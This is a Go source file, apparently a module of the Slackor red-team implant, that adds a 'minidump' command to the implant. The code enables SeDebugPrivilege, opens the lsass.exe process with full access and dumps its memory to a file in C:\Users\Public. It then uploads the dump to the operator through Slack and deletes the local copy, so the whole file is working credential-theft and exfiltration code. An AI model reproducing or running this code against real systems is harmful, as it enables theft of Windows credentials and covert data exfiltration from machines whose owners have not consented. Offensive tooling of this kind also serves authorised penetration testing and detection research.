// +build windows

package windows

import (
	"fmt"
	"io/ioutil"
	"os"
	"syscall"
	"unsafe"

	"github.com/Coalfire-Research/Slackor/internal/slack"
	"github.com/Coalfire-Research/Slackor/pkg/command"

	"golang.org/x/sys/windows"
)

type minidumpFile struct {
	ProcName    string
	ProcID      uint32
	FileContent []byte
}

var (
	tempDir = "C:\\Users\\Public\\"
	process = "lsass.exe"
)

// MiniDump dumps lsass.exe
type MiniDump struct{}

// Name is the name of the command
func (m MiniDump) Name() string {
	return "minidump"
}

// Run dumps lsass.exe
func (m MiniDump) Run(clientID string, jobID string, args []string) (string, error) {
	// All code written by C-Sto  https://github.com/Ne0nd0g/merlin/blob/master/pkg/modules/minidump/minidump.go

	ret := minidumpFile{} // []byte{}
	var err error
	// Make sure temporary directory exists before executing miniDump functionality
	if tempDir != "" {
		d, errS := os.Stat(tempDir)
		if os.IsNotExist(errS) {
			return "", fmt.Errorf("the provided directory does not exist: %s", tempDir)
		}
		if d.IsDir() != true {
			return "", fmt.Errorf("the provided path is not a valid directory: %s", tempDir)
		}
	} else {
		tempDir = os.TempDir()
	}

	// Get the process PID or name
	ret.ProcName, ret.ProcID, err = getProcess(process, 0)
	if err != nil {
		return "", err
	}

	// Get debug privs (required for dumping processes not owned by current user)
	err = sePrivEnable("SeDebugPrivilege")
	if err != nil {
		return "", err
	}

	// Get a handle to process
	hProc, err := syscall.OpenProcess(0x1F0FFF, false, ret.ProcID) //PROCESS_ALL_ACCESS := uint32(0x1F0FFF)
	if err != nil {
		return "", err
	}

	// Set up the temporary file to write to, automatically remove it once done
	// TODO: Work out how to do this in memory

	//f, tempErr := ioutil.TempFile(tempDir, "*.tmp")
	f, tempErr := os.Create("C:\\Users\\Public\\" + clientID + ".dmp")
	if tempErr != nil {
		return "", tempErr
	}

	// Remove the file after the function exits, regardless of error nor not
	// Upload here
	//defer os.Remove(f.Name())

	// Load MiniDumpWriteDump function from DbgHelp.dll
	k32 := windows.NewLazySystemDLL("DbgHelp.dll")
	miniDump := k32.NewProc("MiniDumpWriteDump")

	/*
		BOOL MiniDumpWriteDump(
		  HANDLE                            hProcess,
		  DWORD                             ProcessId,
		  HANDLE                            hFile,
		  MINIDUMP_TYPE                     DumpType,
		  PMINIDUMP_EXCEPTION_INFORMATION   ExceptionParam,
		  PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,
		  PMINIDUMP_CALLBACK_INFORMATION    CallbackParam
		);
	*/
	// Call Windows MiniDumpWriteDump API
	r, _, _ := miniDump.Call(uintptr(hProc), uintptr(ret.ProcID), f.Fd(), 3, 0, 0, 0)

	// idk why this fixes the 'not same as on disk' issue, but it does
	f.Close()
	// Upload lsass.exe dump
	err = slack.Upload(clientID, jobID, "C:\\Users\\Public\\"+clientID+".dmp")
	if err != nil {
		return "", err
	}
	err = os.Remove("C:\\Users\\Public\\" + clientID + ".dmp")
	if err != nil {
		return "", err
	}
	if r != 0 {
		ret.FileContent, err = ioutil.ReadFile(f.Name())
		if err != nil {
			f.Close()
			return "", err
		}
	}
	return fmt.Sprintf("%s dumped.", process), nil
}

func sePrivEnable(s string) error {
	type LUID struct {
		LowPart  uint32
		HighPart int32
	}
	type LUID_AND_ATTRIBUTES struct {
		Luid       LUID
		Attributes uint32
	}
	type TOKEN_PRIVILEGES struct {
		PrivilegeCount uint32
		Privileges     [1]LUID_AND_ATTRIBUTES
	}

	modadvapi32 := windows.NewLazySystemDLL("advapi32.dll")
	procAdjustTokenPrivileges := modadvapi32.NewProc("AdjustTokenPrivileges")

	procLookupPriv := modadvapi32.NewProc("LookupPrivilegeValueW")
	var tokenHandle syscall.Token
	thsHandle, err := syscall.GetCurrentProcess()
	if err != nil {
		return err
	}
	syscall.OpenProcessToken(
		//r, a, e := procOpenProcessToken.Call(
		thsHandle,                       //  HANDLE  ProcessHandle,
		syscall.TOKEN_ADJUST_PRIVILEGES, //	DWORD   DesiredAccess,
		&tokenHandle,                    //	PHANDLE TokenHandle
	)
	var luid LUID
	r, _, e := procLookupPriv.Call(
		uintptr(0), //LPCWSTR lpSystemName,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(s))), //LPCWSTR lpName,
		uintptr(unsafe.Pointer(&luid)),                       //PLUID   lpLuid
	)
	if r == 0 {
		return e
	}
	SE_PRIVILEGE_ENABLED := uint32(0x00000002)
	privs := TOKEN_PRIVILEGES{}
	privs.PrivilegeCount = 1
	privs.Privileges[0].Luid = luid
	privs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
	//AdjustTokenPrivileges(hToken, false, &priv, 0, 0, 0)
	r, _, e = procAdjustTokenPrivileges.Call(
		uintptr(tokenHandle),
		uintptr(0),
		uintptr(unsafe.Pointer(&privs)),
		uintptr(0),
		uintptr(0),
		uintptr(0),
	)
	if r == 0 {
		return e
	}
	return nil
}

func getProcess(name string, pid uint32) (string, uint32, error) {
	//https://github.com/mitchellh/go-ps/blob/master/process_windows.go

	if pid <= 0 && name == "" {
		return "", 0, fmt.Errorf("a process name OR process ID must be provided")
	}

	snapshotHandle, err := syscall.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
	if snapshotHandle < 0 || err != nil {
		return "", 0, fmt.Errorf("there was an error creating the snapshot:\r\n%s", err)
	}
	defer syscall.CloseHandle(snapshotHandle)

	var process syscall.ProcessEntry32
	process.Size = uint32(unsafe.Sizeof(process))
	err = syscall.Process32First(snapshotHandle, &process)
	if err != nil {
		return "", 0, fmt.Errorf("there was an accessing the first process in the snapshot:\r\n%s", err)
	}

	for {
		processName := ""
		// Iterate over characters to build a full string
		for _, chr := range process.ExeFile {
			if chr != 0 {
				processName = processName + string(int(chr))
			}
		}
		if pid > 0 {
			if process.ProcessID == pid {
				return processName, pid, nil
			}
		} else if name != "" {
			if processName == name {
				return name, process.ProcessID, nil
			}
		}
		err = syscall.Process32Next(snapshotHandle, &process)
		if err != nil {
			break
		}
	}
	return "", 0, fmt.Errorf("could not find a procces with the supplied name \"%s\" or PID of \"%d\"", name, pid)
}

func init() {
	command.RegisterCommand(MiniDump{})
}
